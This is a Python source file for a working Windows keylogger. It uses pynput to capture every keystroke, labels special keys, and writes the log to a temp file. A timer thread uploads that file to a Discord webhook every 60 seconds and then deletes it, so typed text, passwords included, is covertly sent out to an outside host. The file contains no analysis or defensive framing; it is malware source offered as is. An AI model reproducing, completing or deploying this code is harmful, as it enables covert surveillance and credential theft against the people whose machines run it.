import ctypes
import os
import time
from threading import Timer

import httpx
from pynput.keyboard import Listener


class Keylogger:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/..."
        self.cooldown = 60
        self.logs_path = os.environ['temp'] + "\\log.txt"
        self.logs = ""

    def on_press(self, key):
        try:
            key = str(key).strip('\'')
            match key:
                case 'Key.enter':
                    self.logs += '[ENTER]\n'
                case 'Key.backspace':
                    self.logs += '[BACKSPACE]'
                case 'Key.space':
                    self.logs += ' '
                case 'Key.alt_l':
                    self.logs += '[ALT]'
                case 'Key.tab':
                    self.logs += '[TAB]'
                case 'Key.delete':
                    self.logs += '[DEL]'
                case 'Key.ctrl_l':
                    self.logs += '[CTRL]'
                case 'Key.left':
                    self.logs += '[LEFT ARROW]'
                case 'Key.right':
                    self.logs += '[RIGHT ARROW]'
                case 'Key.up':
                    self.logs += '[UP ARROW]'
                case 'Key.down':
                    self.logs += '[DOWN ARROW]'
                case 'Key.shift':
                    self.logs += '[SHIFT]'
                case '\\x13':
                    self.logs += '[CTRL+S]'
                case '\\x17':
                    self.logs += '[CTRL+W]'
                case 'Key.caps_lock':
                    self.logs += '[CAPS LK]'
                case '\\x01':
                    self.logs += '[CTRL+A]'
                case 'Key.esc':
                    self.logs += '[ESC]'
                case 'Key.cmd':
                    self.logs += '[WIN KEY]'
                case 'Key.print_screen':
                    self.logs += '[PRINT SCR]'
                case '\\x03':
                    self.logs += '[CTRL+C]'
                case '\\x16':
                    self.logs += '[CTRL+V]'
                case unhandled:
                    self.logs += key

            with open(self.logs_path, "w") as f:
                f.write(self.logs)
        except Exception as e:
            print(e)

    def send_to_webhook(self):
        try:
            with open(self.logs_path, 'rb') as f:
                httpx.post(self.webhook, files={'upload_file': f})
            if os.path.exists(self.logs_path):
                os.remove(self.logs_path)
        except Exception as e:
            print(e)

    def _worker(self):
        if len(self.logs) > 1:
            self.send_to_webhook()
            self.logs = ""
        timer = Timer(interval=self.cooldown, function=self._worker)
        timer.daemon = True
        timer.start()

    def copy_file(src, dst):
        ctypes.WinDLL("kernel32").CopyFileW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_bool]
        ctypes.WinDLL("kernel32").CopyFileW(src, dst, False)

    def main(self):
        self._worker()
        while True:
            try:
                listener = Listener(on_press=self.on_press)
                listener.start()
                listener.join()
            except Exception:
                time.sleep(1)
                continue


if __name__ == "__main__":
    Keylogger().main()
